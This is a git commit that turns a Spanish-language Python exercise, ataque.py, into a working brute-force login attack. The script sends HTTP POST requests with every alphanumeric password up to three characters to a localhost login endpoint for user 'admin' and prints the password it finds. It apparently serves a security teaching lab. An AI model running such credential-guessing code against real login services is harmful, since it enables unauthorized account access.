3c42467cdd3610e161d90c400afd5d2faab92e5a
esparzaariel4-boop <esparzaariel4@gmail.com>
2026-04-09 15:50:56 -0500

    Implement brute force attack with HTTP requests

--- ataque.py
+++ ataque.py
@@ -1,34 +1,62 @@
 import itertools
+import requests
 import time
 
+alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+
+url = "http://localhost:8000/login"
+
 username = "admin"
-password_real = "ad12"
 
-alfabeto = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+def brute_force(longitud_max):
 
-intentos = 0
-inicio = time.time()
-encontrada = None
+    intentos = 0
 
-for longitud in range(1, len(password_real) + 1):
-    for combinacion in itertools.product(alfabeto, repeat=longitud):
-        intento = "".join(combinacion)
-        intentos += 1
+    for longitud in range(1, longitud_max + 1):
 
-        print("Intento:", intento)
+        print(f"\nLog {longitud}: probando contraseñas de {longitud} caracteres")
 
-        if intento == password_real:
-            final = time.time()
-            encontrada = intento
-            break
+        for combo in itertools.product(alphabet, repeat=longitud):
 
-    if encontrada:
-        break
+            intentos += 1
 
-print("\n==============================")
-print("Ataque de Fuerza Bruta")
-print("==============================")
+            password = "".join(combo)
+
+            response = requests.post(
+                url,
+                json={
+                    "username": username,
+                    "password": password
+                }
+            )
+
+            if response.status_code == 200 and response.json().get("message") == "Login successful":
+
+                return intentos, password, longitud
+
+    return intentos, None, None
+
+
+print("Iniciando ataque")
 print("Usuario:", username)
-print("Contraseña:", encontrada)
-print("Intentos realizados:", intentos)
-print("Tiempo:", round(final - inicio, 4), "segundos")
+
+inicio = time.time()
+
+intentos, password, log_encontrado = brute_force(3)
+
+tiempo = time.time() - inicio
+
+
+if password:
+
+    print("\nCONTRASEÑA ENCONTRADA")
+    print("log:", log_encontrado)
+    print("usuario:", username)
+    print("password:", password)
+    print("intentos:", intentos)
+    print("tiempo:", round(tiempo,4),"segundos")
+
+else:
+
+    print("\nNo se encontró la contraseña")
+    print("Intentos:", intentos)
